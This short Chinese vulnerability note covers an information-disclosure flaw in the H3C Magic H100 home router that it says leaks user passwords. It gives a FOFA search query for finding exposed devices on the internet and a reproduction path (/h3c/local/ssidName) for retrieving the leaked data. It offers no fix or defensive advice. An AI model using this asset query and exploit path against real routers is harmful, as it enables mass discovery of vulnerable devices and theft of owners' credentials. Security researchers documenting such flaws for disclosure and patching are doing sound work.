H3C Magic H100是新华三技术有限公司特别设计的全千兆家庭智能中枢。H3C-H100路由器信息泄露漏洞,可泄露用户泄露密码

# 二、影响版本
+ H3C多系列路由器

# 三、资产测绘
+ fofa`body="/grwizard/h3c.ico"`
+ 登录页面

# 四、漏洞复现

```java
/h3c/local/ssidName
```
